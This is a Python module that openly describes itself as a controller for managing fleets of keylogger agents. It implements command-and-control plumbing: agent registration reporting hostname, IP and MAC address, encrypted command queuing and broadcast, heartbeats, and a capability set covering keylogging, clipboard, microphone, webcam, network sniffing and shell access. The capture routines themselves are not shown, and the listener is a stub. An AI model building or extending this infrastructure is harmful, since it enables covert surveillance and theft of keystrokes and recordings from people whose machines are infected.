"""
Distributed Fleet Management - Agent-Controller Architecture.

A robust distributed system for managing multiple keylogger agents from a central controller.
Provides secure communication, command distribution, and fleet coordination.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import secrets
import struct
import time
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple, Union
from uuid import uuid4

from utils.crypto import generate_rsa_key_pair, encrypt_with_public_key, decrypt_with_private_key
from transport.base import BaseTransport
from transport.http_transport import HttpTransport


logger = logging.getLogger(__name__)


class AgentStatus(Enum):
    """Agent connection status."""

    ONLINE = auto()
    OFFLINE = auto()
    BUSY = auto()
    ERROR = auto()
    UNREGISTERED = auto()


class CommandStatus(Enum):
    """Command execution status."""

    PENDING = auto()
    QUEUED = auto()
    SENT = auto()
    RECEIVED = auto()
    EXECUTING = auto()
    COMPLETED = auto()
    FAILED = auto()
    CANCELLED = auto()
    TIMEOUT = auto()


class CommandPriority(Enum):
    """Command priority levels."""

    CRITICAL = 0
    HIGH = 1
    NORMAL = 2
    LOW = 3


@dataclass(frozen=True)
class AgentCapabilities:
    """Agent capabilities bitmask."""

    keylogging: bool = True
    screenshots: bool = False
    file_upload: bool = False
    file_download: bool = False
    clipboard_monitor: bool = False
    microphone_record: bool = False
    webcam_capture: bool = False
    process_monitor: bool = False
    network_sniff: bool = False
    shell_access: bool = False


@dataclass
class AgentMetadata:
    """Metadata about a registered agent."""

    agent_id: str
    hostname: str
    platform: str
    version: str
    ip_address: str
    mac_address: str
    capabilities: AgentCapabilities
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    status: AgentStatus = AgentStatus.ONLINE
    uptime: float = 0.0
    total_commands_executed: int = 0
    failed_commands: int = 0
    tags: Set[str] = field(default_factory=set)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": self.platform,
            "version": self.version,
            "ip_address": self.ip_address,
            "mac_address": self.mac_address,
            "capabilities": asdict(self.capabilities),
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "status": self.status.name,
            "uptime": self.uptime,
            "total_commands_executed": self.total_commands_executed,
            "failed_commands": self.failed_commands,
            "tags": list(self.tags),
        }


@dataclass
class Command:
    """Command to be executed by agents."""

    command_id: str
    agent_id: str
    action: str
    parameters: Dict[str, Any]
    priority: CommandPriority
    timestamp: float = field(default_factory=time.time)
    timeout: float = 300.0  # 5 minutes default timeout
    retries: int = 3
    status: CommandStatus = CommandStatus.PENDING
    result: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None
    started_at: Optional[float] = None
    completed_at: Optional[float] = None

    @property
    def is_expired(self) -> bool:
        """Check if command has expired."""
        if self.status in (CommandStatus.COMPLETED, CommandStatus.FAILED, CommandStatus.CANCELLED):
            return False
        return time.time() - self.timestamp > self.timeout

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for transmission."""
        return {
            "command_id": self.command_id,
            "action": self.action,
            "parameters": self.parameters,
            "timestamp": self.timestamp,
            "priority": self.priority.name,
            "timeout": self.timeout,
        }


class ProtocolMessage:
    """Message format for agent-controller communication."""

    VERSION = "1.0"

    def __init__(
        self,
        msg_type: str,
        payload: Dict[str, Any],
        agent_id: Optional[str] = None,
        signature: Optional[bytes] = None,
    ):
        self.msg_type = msg_type
        self.payload = payload
        self.agent_id = agent_id
        self.timestamp = time.time()
        self.version = self.VERSION
        self.signature = signature

    def to_bytes(self) -> bytes:
        """Serialize message to bytes."""
        data = {
            "version": self.version,
            "type": self.msg_type,
            "agent_id": self.agent_id,
            "timestamp": self.timestamp,
            "payload": self.payload,
            "signature": self.signature.decode() if self.signature else None,
        }
        return json.dumps(data).encode("utf-8")

    @classmethod
    def from_bytes(cls, data: bytes) -> "ProtocolMessage":
        """Deserialize message from bytes."""
        parsed = json.loads(data.decode("utf-8"))
        return cls(
            msg_type=parsed["type"],
            payload=parsed["payload"],
            agent_id=parsed.get("agent_id"),
            signature=parsed.get("signature").encode() if parsed.get("signature") else None,
        )


class SecureChannel:
    """Encrypted communication channel between agent and controller."""

    def __init__(self):
        self.private_key: Optional[bytes] = None
        self.public_key: Optional[bytes] = None
        self.remote_public_key: Optional[bytes] = None
        self.session_key: Optional[bytes] = None
        self._initialized = False

    def initialize(self) -> Tuple[bytes, bytes]:
        """Generate key pair for this channel."""
        pub_key, priv_key = generate_rsa_key_pair()
        self.public_key = pub_key
        self.private_key = priv_key
        self._initialized = True
        return pub_key, priv_key

    def set_remote_key(self, remote_public_key: bytes) -> None:
        """Set the remote party's public key."""
        self.remote_public_key = remote_public_key

    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data using remote public key."""
        if not self.remote_public_key:
            raise ValueError("Remote public key not set")
        return encrypt_with_public_key(self.remote_public_key, data)

    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data using local private key."""
        if not self.private_key:
            raise ValueError("Private key not initialized")
        return decrypt_with_private_key(self.private_key, data)

    def sign(self, data: bytes) -> bytes:
        """Sign data with private key."""
        if not self.private_key or not self.public_key:
            raise ValueError("Keys not initialized")
        # Simple signature: hash and encrypt with private key (decrypt operation)
        data_hash = hashlib.sha256(data).digest()
        return decrypt_with_private_key(self.private_key, data_hash)


class Controller:
    """
    Central controller managing a fleet of agents.

    Features:
    - Agent registration and authentication
    - Secure command distribution
    - Fleet-wide operations (broadcast commands)
    - Status monitoring and health checks
    - Command queuing with priority
    """

    def __init__(self, config: Dict[str, Any]) -> None:
        self.config = config
        self.agents: Dict[str, AgentMetadata] = {}
        self.commands: Dict[str, Command] = {}
        self.command_queues: Dict[str, asyncio.PriorityQueue[Tuple[int, Command]]] = {}
        self.agent_channels: Dict[str, SecureChannel] = {}
        self.agent_transports: Dict[str, BaseTransport] = {}
        self.running = False
        self._command_processor_task: Optional[asyncio.Task] = None
        self._cleanup_task: Optional[asyncio.Task] = None

        # Configuration
        self.heartbeat_timeout = float(config.get("heartbeat_timeout", 120))
        self.max_command_history = int(config.get("max_command_history", 1000))
        self.cleanup_interval = float(config.get("cleanup_interval", 300))

    async def start(self) -> None:
        """Start the controller service."""
        self.running = True
        self._command_processor_task = asyncio.create_task(self._process_commands())
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("Controller started")

    async def stop(self) -> None:
        """Stop the controller service."""
        self.running = False
        if self._command_processor_task:
            self._command_processor_task.cancel()
        if self._cleanup_task:
            self._cleanup_task.cancel()

        # Close all transport connections
        for transport in self.agent_transports.values():
            try:
                transport.disconnect()
            except Exception:
                pass

        logger.info("Controller stopped")

    def register_agent(
        self, metadata: AgentMetadata, transport: BaseTransport, public_key: bytes
    ) -> SecureChannel:
        """Register a new agent with the controller."""
        agent_id = metadata.agent_id

        # Create secure channel
        channel = SecureChannel()
        channel.initialize()
        channel.set_remote_key(public_key)

        self.agents[agent_id] = metadata
        self.agent_channels[agent_id] = channel
        self.agent_transports[agent_id] = transport
        self.command_queues[agent_id] = asyncio.PriorityQueue()

        logger.info(f"Agent registered: {agent_id} ({metadata.hostname})")
        return channel

    def unregister_agent(self, agent_id: str) -> None:
        """Unregister an agent."""
        if agent_id in self.agents:
            self.agents[agent_id].status = AgentStatus.UNREGISTERED
            del self.agents[agent_id]
            del self.agent_channels[agent_id]
            del self.command_queues[agent_id]

            if agent_id in self.agent_transports:
                self.agent_transports[agent_id].disconnect()
                del self.agent_transports[agent_id]

            logger.info(f"Agent unregistered: {agent_id}")

    def send_command(
        self,
        agent_id: str,
        action: str,
        parameters: Dict[str, Any],
        priority: CommandPriority = CommandPriority.NORMAL,
        timeout: float = 300.0,
    ) -> Optional[str]:
        """Send a command to a specific agent."""
        if agent_id not in self.agents:
            logger.error(f"Cannot send command: agent {agent_id} not found")
            return None

        command = Command(
            command_id=str(uuid4()),
            agent_id=agent_id,
            action=action,
            parameters=parameters,
            priority=priority,
            timeout=timeout,
        )

        self.commands[command.command_id] = command

        # Add to agent's command queue
        queue = self.command_queues.get(agent_id)
        if queue:
            asyncio.create_task(queue.put((priority.value, command)))
            logger.info(f"Command {command.command_id} queued for agent {agent_id}")

        return command.command_id

    def broadcast_command(
        self,
        action: str,
        parameters: Dict[str, Any],
        priority: CommandPriority = CommandPriority.NORMAL,
        filter_func: Optional[Callable[[AgentMetadata], bool]] = None,
    ) -> List[str]:
        """Broadcast a command to multiple agents."""
        command_ids = []

        for agent_id, metadata in self.agents.items():
            if filter_func and not filter_func(metadata):
                continue

            command_id = self.send_command(agent_id, action, parameters, priority)
            if command_id:
                command_ids.append(command_id)

        logger.info(f"Broadcast command sent to {len(command_ids)} agents")
        return command_ids

    def get_agent(self, agent_id: str) -> Optional[AgentMetadata]:
        """Get metadata for a specific agent."""
        return self.agents.get(agent_id)

    def get_all_agents(self) -> List[AgentMetadata]:
        """Get metadata for all registered agents."""
        return list(self.agents.values())

    def get_command(self, command_id: str) -> Optional[Command]:
        """Get command by ID."""
        return self.commands.get(command_id)

    def get_agent_commands(self, agent_id: str) -> List[Command]:
        """Get all commands for an agent."""
        return [cmd for cmd in self.commands.values() if cmd.agent_id == agent_id]

    async def handle_heartbeat(self, agent_id: str, data: Dict[str, Any]) -> None:
        """Handle heartbeat from an agent."""
        agent = self.agents.get(agent_id)
        if not agent:
            logger.warning(f"Heartbeat from unknown agent: {agent_id}")
            return

        agent.last_seen = time.time()
        agent.status = AgentStatus(data.get("status", "ONLINE"))
        agent.uptime = data.get("uptime", 0.0)

        # Update capabilities if provided
        if "capabilities" in data:
            agent.capabilities = AgentCapabilities(**data["capabilities"])

    async def handle_command_response(
        self, agent_id: str, command_id: str, result: Dict[str, Any]
    ) -> None:
        """Handle command response from an agent."""
        command = self.commands.get(command_id)
        if not command:
            logger.warning(f"Response for unknown command: {command_id}")
            return

        command.result = result
        command.completed_at = time.time()

        if result.get("success", False):
            command.status = CommandStatus.COMPLETED
            self.agents[agent_id].total_commands_executed += 1
            logger.info(f"Command {command_id} completed successfully")
        else:
            command.status = CommandStatus.FAILED
            command.error_message = result.get("error")
            self.agents[agent_id].failed_commands += 1
            logger.error(f"Command {command_id} failed: {command.error_message}")

    async def _process_commands(self) -> None:
        """Process commands from queues and send to agents."""
        while self.running:
            try:
                for agent_id, queue in self.command_queues.items():
                    if queue.empty():
                        continue

                    _, command = await queue.get()
                    await self._send_command_to_agent(agent_id, command)

                await asyncio.sleep(0.1)  # Prevent CPU spinning
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error processing commands: {e}")

    async def _send_command_to_agent(self, agent_id: str, command: Command) -> None:
        """Send a command to an agent."""
        agent = self.agents.get(agent_id)
        transport = self.agent_transports.get(agent_id)
        channel = self.agent_channels.get(agent_id)

        if not all([agent, transport, channel]):
            logger.error(f"Cannot send command: agent {agent_id} incomplete setup")
            command.status = CommandStatus.FAILED
            return

        # Type narrowing for the type checker
        assert transport is not None
        assert channel is not None

        try:
            # Encrypt command payload
            command_data = json.dumps(command.to_dict()).encode()
            encrypted_payload = channel.encrypt(command_data)
            signature = channel.sign(command_data)

            # Create message
            message = ProtocolMessage(
                msg_type="command",
                payload={"encrypted": encrypted_payload.decode(), "signature": signature.decode()},
                agent_id=agent_id,
            )

            # Send via transport
            success = transport.send(message.to_bytes())

            if success:
                command.status = CommandStatus.SENT
                command.started_at = time.time()
                logger.info(f"Command {command.command_id} sent to agent {agent_id}")
            else:
                command.status = CommandStatus.FAILED
                logger.error(f"Failed to send command {command.command_id} to agent {agent_id}")

        except Exception as e:
            command.status = CommandStatus.FAILED
            command.error_message = str(e)
            logger.error(f"Error sending command {command.command_id}: {e}")

    async def _cleanup_loop(self) -> None:
        """Periodic cleanup of stale agents and old commands."""
        while self.running:
            try:
                await asyncio.sleep(self.cleanup_interval)

                current_time = time.time()

                # Check for stale agents
                for agent_id, agent in list(self.agents.items()):
                    if current_time - agent.last_seen > self.heartbeat_timeout:
                        agent.status = AgentStatus.OFFLINE
                        logger.warning(f"Agent {agent_id} marked as offline (timeout)")

                # Clean up old completed commands
                commands_to_remove = []
                for cmd_id, command in self.commands.items():
                    if command.status in (
                        CommandStatus.COMPLETED,
                        CommandStatus.FAILED,
                        CommandStatus.CANCELLED,
                    ):
                        if command.completed_at and current_time - command.completed_at > 3600:
                            commands_to_remove.append(cmd_id)

                for cmd_id in commands_to_remove:
                    del self.commands[cmd_id]

                if commands_to_remove:
                    logger.info(f"Cleaned up {len(commands_to_remove)} old commands")

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")


class Agent:
    """
    Agent that connects to a central controller.

    Features:
    - Automatic registration and heartbeat
    - Secure command execution
    - Status reporting
    - Automatic reconnection
    """

    def __init__(self, config: Dict[str, Any]) -> None:
        self.config = config
        self.agent_id = config.get("agent_id", str(uuid4()))
        self.controller_url = config.get("controller_url")
        self.hostname = config.get("hostname", "unknown")
        self.platform = config.get("platform", "unknown")
        self.version = config.get("version", "1.0.0")
        self.mac_address = config.get("mac_address", "00:00:00:00:00:00")

        # Capabilities
        self.capabilities = AgentCapabilities(
            keylogging=config.get("cap_keylogging", True),
            screenshots=config.get("cap_screenshots", False),
            file_upload=config.get("cap_file_upload", False),
            file_download=config.get("cap_file_download", False),
            clipboard_monitor=config.get("cap_clipboard", False),
            microphone_record=config.get("cap_microphone", False),
            webcam_capture=config.get("cap_webcam", False),
            process_monitor=config.get("cap_process", False),
            network_sniff=config.get("cap_network", False),
            shell_access=config.get("cap_shell", False),
        )

        # Communication
        self.transport: Optional[BaseTransport] = None
        self.secure_channel = SecureChannel()
        self.public_key, self.private_key = self.secure_channel.initialize()

        # State
        self.running = False
        self.registered = False
        self.uptime = 0.0
        self.start_time = time.time()
        self.command_handlers: Dict[str, Callable[[Dict[str, Any]], Dict[str, Any]]] = {}
        self._heartbeat_task: Optional[asyncio.Task] = None
        self._command_listener_task: Optional[asyncio.Task] = None

        # Intervals
        self.heartbeat_interval = float(config.get("heartbeat_interval", 60))
        self.reconnect_interval = float(config.get("reconnect_interval", 30))
        self.max_retries = int(config.get("max_retries", 5))

        # Register default command handlers
        self._register_default_handlers()

    def _register_default_handlers(self) -> None:
        """Register default command handlers."""
        self.command_handlers.update(
            {
                "ping": self._handle_ping,
                "update_config": self._handle_update_config,
                "get_status": self._handle_get_status,
                "shutdown": self._handle_shutdown,
            }
        )

    async def start(self) -> None:
        """Start the agent service."""
        self.running = True
        self.start_time = time.time()

        # Initialize transport
        self.transport = HttpTransport(
            {
                "url": self.controller_url,
                "method": "POST",
                "headers": {"Content-Type": "application/json"},
            }
        )

        # Attempt registration
        await self._register()

        # Start background tasks
        self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())
        self._command_listener_task = asyncio.create_task(self._command_listener())

        logger.info(f"Agent {self.agent_id} started")

    async def stop(self) -> None:
        """Stop the agent service."""
        self.running = False

        if self._heartbeat_task:
            self._heartbeat_task.cancel()
        if self._command_listener_task:
            self._command_listener_task.cancel()

        if self.transport:
            self.transport.disconnect()

        logger.info(f"Agent {self.agent_id} stopped")

    async def _register(self) -> bool:
        """Register with the controller."""
        try:
            # Get IP address
            import socket

            ip_address = socket.gethostbyname(socket.gethostname())

            metadata = AgentMetadata(
                agent_id=self.agent_id,
                hostname=self.hostname,
                platform=self.platform,
                version=self.version,
                ip_address=ip_address,
                mac_address=self.mac_address,
                capabilities=self.capabilities,
            )

            message = ProtocolMessage(
                msg_type="register",
                payload={"metadata": metadata.to_dict(), "public_key": self.public_key.decode()},
                agent_id=self.agent_id,
            )

            if not self.transport:
                raise ValueError("Transport not initialized")
            success = self.transport.send(message.to_bytes())
            if success:
                self.registered = True
                logger.info(f"Agent {self.agent_id} registered successfully")

            return success

        except Exception as e:
            logger.error(f"Registration failed: {e}")
            return False

    async def _heartbeat_loop(self) -> None:
        """Send periodic heartbeats to controller."""
        while self.running:
            try:
                await asyncio.sleep(self.heartbeat_interval)

                self.uptime = time.time() - self.start_time

                message = ProtocolMessage(
                    msg_type="heartbeat",
                    payload={
                        "uptime": self.uptime,
                        "status": "ONLINE",
                        "capabilities": asdict(self.capabilities),
                    },
                    agent_id=self.agent_id,
                )

                if not self.transport:
                    logger.warning("Transport not initialized")
                    continue
                success = self.transport.send(message.to_bytes())
                if not success:
                    logger.warning("Heartbeat failed, will retry")

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")

    async def _command_listener(self) -> None:
        """Listen for incoming commands."""
        # In HTTP mode, commands are received via polling or webhook
        # For now, we'll simulate by checking periodically
        while self.running:
            try:
                await asyncio.sleep(1)
                # Commands would be received here via transport.receive() or similar
                # For HTTP transport, we'd need to implement a polling mechanism
                # or switch to a WebSocket transport for real-time communication
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Command listener error: {e}")

    def register_command_handler(
        self, action: str, handler: Callable[[Dict[str, Any]], Dict[str, Any]]
    ) -> None:
        """Register a custom command handler."""
        self.command_handlers[action] = handler
        logger.info(f"Registered handler for action: {action}")

    async def handle_command(self, command_data: bytes) -> bytes:
        """Process incoming command and return response."""
        try:
            message = ProtocolMessage.from_bytes(command_data)

            if message.msg_type != "command":
                return self._create_error_response("invalid_message_type")

            # Decrypt command payload
            encrypted_payload = message.payload.get("encrypted", "").encode()
            decrypted_data = self.secure_channel.decrypt(encrypted_payload)
            command_dict = json.loads(decrypted_data.decode())

            command = Command(**command_dict)
            handler = self.command_handlers.get(command.action)

            if not handler:
                return self._create_error_response(f"unknown_action: {command.action}")

            # Execute command
            result = handler(command.parameters)

            # Send response
            response_message = ProtocolMessage(
                msg_type="command_response",
                payload={"command_id": command.command_id, "result": result, "success": True},
                agent_id=self.agent_id,
            )

            return response_message.to_bytes()

        except Exception as e:
            logger.error(f"Error handling command: {e}")
            return self._create_error_response(str(e))

    def _create_error_response(self, error_message: str) -> bytes:
        """Create error response message."""
        message = ProtocolMessage(
            msg_type="command_response",
            payload={"success": False, "error": error_message},
            agent_id=self.agent_id,
        )
        return message.to_bytes()

    # Default command handlers
    def _handle_ping(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle ping command."""
        return {"pong": True, "timestamp": time.time()}

    def _handle_update_config(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle configuration update."""
        self.config.update(params)
        return {"status": "config_updated"}

    def _handle_get_status(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle status request."""
        return {
            "agent_id": self.agent_id,
            "uptime": time.time() - self.start_time,
            "registered": self.registered,
            "capabilities": asdict(self.capabilities),
        }

    def _handle_shutdown(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle shutdown command."""
        asyncio.create_task(self.stop())
        return {"status": "shutting_down"}


# Convenience functions
async def create_controller(config: Dict[str, Any]) -> Controller:
    """Create and start a controller instance."""
    controller = Controller(config)
    await controller.start()
    return controller


async def create_agent(config: Dict[str, Any]) -> Agent:
    """Create and start an agent instance."""
    agent = Agent(config)
    await agent.start()
    return agent
